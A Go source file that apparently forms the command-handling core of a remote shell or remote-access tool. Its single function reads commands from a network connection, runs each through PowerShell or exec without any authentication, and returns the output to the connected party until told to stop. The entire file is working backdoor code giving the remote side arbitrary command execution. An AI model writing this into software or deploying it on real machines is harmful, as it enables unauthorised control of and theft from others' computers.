package commands

import (
	"bufio"
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

type Command struct {
	CmdOutput string
	CmdError  string
}

func ExecuteCommandWindows(conn net.Conn) (err error) {

	reader := bufio.NewReader(conn)

	looper := true

	for looper {
		// fmt.Println("loop started")

		rawUserInput, err := reader.ReadString('\n')

		if err != nil {
			fmt.Println(err)
			continue
		}
		userInput := strings.TrimSuffix(rawUserInput, "\n")
		if userInput == "stop" {
			looper = false

		} else {

			fmt.Println("[+] User Command: ", userInput)

			var cmdInstance *exec.Cmd

			if runtime.GOOS == "windows" {
				cmdInstance = exec.Command("powershell.exe", "/C", userInput)
			} else {
				cmdInstance = exec.Command(userInput)
			}

			var output bytes.Buffer
			var commandErr bytes.Buffer

			cmdInstance.Stdout = &output
			cmdInstance.Stderr = &commandErr

			err = cmdInstance.Run()
			if err != nil {
				fmt.Println(err)
			}

			cmdStruct := &Command{}

			cmdStruct.CmdOutput = output.String()
			cmdStruct.CmdError = commandErr.String()

			encoder := gob.NewEncoder(conn)

			err = encoder.Encode(cmdStruct)

			if err != nil {
				fmt.Println(err)
				continue
			}
		}
	}
	return
}
